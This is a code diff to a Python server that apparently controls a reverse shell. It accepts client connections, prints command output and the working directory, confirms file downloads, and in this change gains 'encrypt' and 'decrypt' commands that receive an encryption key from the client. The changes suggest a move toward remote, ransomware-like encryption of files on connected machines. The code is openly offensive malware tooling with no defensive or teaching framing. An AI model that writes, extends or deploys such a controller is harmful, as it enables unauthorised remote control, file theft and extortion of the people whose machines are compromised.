@@ -7,6 +7,8 @@ BUFFER_SIZE = 1024 # max size of messages
 
 SEPARATOR = "<sep>"
 
+encryption_key = None
+
 s = socket.socket()
 
 # bind the socket
@@ -54,26 +56,13 @@ while True:
         print("Download successful!")
 
         client_socket.send("1".encode())
+    elif splitted_command[0].lower() == "encrypt":
+        encryption_key = client_socket.recv(BUFFER_SIZE)
+        client_socket.send("1".encode())
+    elif splitted_command[0].lower() == "decrypt":
+        encryption_key = client_socket.recv(BUFFER_SIZE)
+        client_socket.send("1".encode())
 
-        """
-        file_size = int(client_socket.recv(BUFFER_SIZE).decode())
-        print(file_size)
-        data = client_socket.recv(file_size)
-        with open(file_name, "wb") as f:
-            f.write(data)
-        """
-        """
-        with open(file_name, "wb") as f:
-            while True:
-                # read 1024 bytes from the socket (receive)
-                data = client_socket.recv(BUFFER_SIZE)
-                if not data:    
-                    # nothing is received
-                    # file transmitting is done
-                    break
-                # write to the file the bytes we just received
-                f.write(data)
-        """
     output = client_socket.recv(BUFFER_SIZE).decode()
     results, cwd = output.split(SEPARATOR)
     print(results)
